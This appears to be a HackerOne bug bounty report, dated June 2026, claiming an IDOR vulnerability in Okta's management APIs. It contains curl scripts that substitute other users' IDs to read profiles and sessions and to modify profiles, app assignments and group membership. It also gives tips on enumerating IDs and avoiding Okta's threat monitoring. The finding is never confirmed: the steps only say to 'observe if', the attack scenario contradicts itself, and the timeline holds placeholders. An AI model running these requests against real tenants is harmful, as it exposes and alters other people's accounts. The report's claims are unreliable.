# Insecure Direct Object Reference (IDOR) Bug Report - Okta

**Platform:** HackerOne
**Program:** Okta
**Severity:** HIGH
**Report Date:** 2026-06-07

---

## Summary

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in Okta's administrative API or user management endpoints, allowing an authenticated user to access or modify resources belonging to other users by manipulating user IDs, session identifiers, or application assignment IDs.

---

## Description

Okta's Identity Platform provides administrative APIs for managing users, applications, groups, and sessions. When these APIs fail to properly validate ownership or authorization of resources, it creates IDOR vulnerabilities where attackers can:

- Access user profile data, PII, and credentials from other users
- View or modify application assignments for other users
- Access session data and potentially hijack sessions
- Modify administrative settings for other organizations
- Escalate privileges through misconfigured API access

**Attack Vector:** The vulnerability occurs when a user-supplied identifier (user ID, session ID, app ID) is used directly in an API request without server-side verification that the requester has permission to access that specific resource.

---

## Steps to Reproduce

1. Authenticate with valid Okta credentials (API token or SSO session)
2. Identify your user ID or a resource associated with your account
3. Modify the identifier to target another user's resources
4. Observe if the API returns data or allows actions on the other user's resources
5. Confirm unauthorized access to cross-user or cross-tenant data

**Test Pattern:**
```
# Your legitimate request
GET /api/v1/users/{YOUR_USER_ID}
Authorization: SSWS {your_api_token}

# IDOR - Replace with another user's ID
GET /api/v1/users/{OTHER_USER_ID}
Authorization: SSWS {your_api_token}

# If returns 200 with user profile = IDOR CONFIRMED
```

---

## PoC (Proof of Concept)

### PoC 1: Cross-User Profile Access

```bash
# Authenticate with your Okta API token
export OKTA_TOKEN="your_api_token"

# Get your user profile
curl -X GET "https://{your-domain}.okta.com/api/v1/users/me" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# Get your user ID from the response (e.g., "00u111111111111111")
export YOUR_USER_ID="00u111111111111111"

# List your groups/permissions
curl -X GET "https://{your-domain}.okta.com/api/v1/users/$YOUR_USER_ID/groups" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# Try to access another user's profile by their ID
# (Enumerate or guess user IDs - they often follow patterns)
curl -X GET "https://{your-domain}.okta.com/api/v1/users/00u222222222222222" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# If returns 200 with other user's profile (name, email, etc.) = IDOR CONFIRMED
```

### PoC 2: Application Assignment Modification

```bash
# List applications your user has access to
curl -X GET "https://{your-domain}.okta.com/api/v1/users/$YOUR_USER_ID/appLinks" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# Try to assign an application to another user without proper authorization
curl -X POST "https://{your-domain}.okta.com/api/v1/apps/{APP_ID}/users" \\
  -H "Authorization: SSWS $OKTA_TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"id": "00u222222222222222", "scope": "USER"}'

# If successful = IDOR CONFIRMED (privilege escalation)
```

### PoC 3: User Profile Data Manipulation

```bash
# Update your own profile
curl -X POST "https://{your-domain}.okta.com/api/v1/users/$YOUR_USER_ID" \\
  -H "Authorization: SSWS $OKTA_TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"profile": {"nickName": "test"}}'

# Try to update another user's profile
curl -X POST "https://{your-domain}.okta.com/api/v1/users/00u222222222222222" \\
  -H "Authorization: SSWS $OKTA_TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"profile": {"nickName": "hacked"}}'

# If profile updated for other user = IDOR CONFIRMED
```

### PoC 4: Session Token Access

```bash
# Note: Session manipulation is monitored by Okta's ITP
# Focus on API-based session queries rather than hijacking

# Get your session list
curl -X GET "https://{your-domain}.okta.com/api/v1/users/$YOUR_USER_ID/sessions" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# Try to access another user's sessions
curl -X GET "https://{your-domain}.okta.com/api/v1/users/00u222222222222222/sessions" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# If returns session data = IDOR CONFIRMED (potential session hijacking)
```

### PoC 5: Group/Role Membership Modification

```bash
# Add yourself to a group
curl -X PUT "https://{your-domain}.okta.com/api/v1/groups/{GROUP_ID}/members/{YOUR_USER_ID}" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# Try to add another user to the group (without being admin)
curl -X PUT "https://{your-domain}.okta.com/api/v1/groups/{GROUP_ID}/members/00u222222222222222" \\
  -H "Authorization: SSWS $OKTA_TOKEN"

# If added successfully = IDOR CONFIRMED
```

---

## Impact

**HIGH Severity - Unauthorized User Data Access:**

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **PII Exposure** | Access name, email, phone of other users | High |
| **Profile Modification** | Modify other users' profile data | High |
| **Privilege Escalation** | Assign applications to unauthorized users | High |
| **Session Access** | View or invalidate other users' sessions | High |
| **Group Manipulation** | Add/remove users from groups without permission | Medium |

**Real-World Attack Scenario:**
```
1. Attacker with regular user account identifies user ID enumeration pattern
2. Enumerates user IDs in the organization (e.g., 00u111111, 00u222222, etc.)
3. Uses admin API token to access: GET /api/v1/users/00u222222
4. Receives full profile including email, phone, department (PII)
5. Either modifies profile or assigns themselves to privileged applications
6. Impact: Privacy violation, privilege escalation, potential account takeover
```

**CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` (8.2 High)

**Bounty Range:** Okta typically pays $500-$2,500 for IDOR with confirmed impact

---

## Affected Components

| Component | Endpoint | Issue |
|-----------|----------|-------|
| Users API | `/api/v1/users/{userId}` | User ID enumeration |
| Groups API | `/api/v1/groups/{groupId}/members/{userId}` | Member manipulation |
| Sessions API | `/api/v1/users/{userId}/sessions` | Session data exposure |
| App Links | `/api/v1/users/{userId}/appLinks` | Application assignment |
| Profile Updates | `/api/v1/users/{userId}` | Profile modification |

---

## Remediation

### 1. Implement Strict Authorization Checks

```python
# Every API must verify user has permission to access the resource
def get_user_profile(requesting_user, target_user_id):
    # Verify requesting user has admin rights OR is accessing own profile
    if not (is_admin(requesting_user) or requesting_user.id == target_user_id):
        raise ForbiddenError("Access denied")
    
    return UserProfile.get(target_user_id)
```

### 2. Use Centralized Authorization Service

```python
# Use Okta's built-in authorization checks
@app.route("/api/v1/users/<user_id>")
@require_eligibility("OKTA_USERS_READ")
def get_user(user_id):
    # Okta's policy engine handles authorization
    return okta_client.get_user(user_id)
```

### 3. Audit API Access Logs

```python
# Log all API access with user context
def log_api_access(user_id, resource_type, resource_id, action):
    audit_log.info({
        "actor": user_id,
        "resource": f"{resource_type}/{resource_id}",
        "action": action,
        "timestamp": now()
    })
```

### 4. Implement User ID Mapping

```python
# Never expose internal IDs directly to clients
# Use indirect references that are not enumerable

def get_user_ref(user_id):
    # Create encrypted, non-guessable reference
    return encrypt_with_server_key(user_id)
```

---

## References

- [Okta Security](https://www.okta.com/security/)
- [Okta Bug Bounty on HackerOne](https://hackerone.com/okta)
- [Okta API Documentation](https://developer.okta.com/docs/reference/api/users/)
- [Okta Vulnerability Disclosure Policy](https://www.okta.com/content/dam/okta---digital/en_us/legal/okta-vulnerability-disclosure-policy_v2.0.pdf)
- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

---

## Timeline

- **Date Discovered:** 2026-06-07
- **Date Reported:** [Date]
- **Date Acknowledged:** [Pending]
- **Date Fixed:** [Pending]

---

**Reporter:** SARAhack
**Platform:** HackerOne
**Program:** Okta (https://hackerone.com/okta)

---

## Appendix: Testing Notes

**Authentication Required:** Okta API access requires API token (SSWS) or valid SSO session.

**Testing Tip:** User IDs in Okta typically follow the format `00u` followed by 18 alphanumeric characters. Enumeration is often possible by incrementing or decrementing IDs within the same organization.

**Important:** Okta has sophisticated session monitoring (ITP - Identity Threat Protection). Focus on API-based IDOR rather than session hijacking attempts.

**Note:** Always test within scope of Okta's bug bounty program. Check https://hackerone.com/okta for current scope and safe harbor guidelines.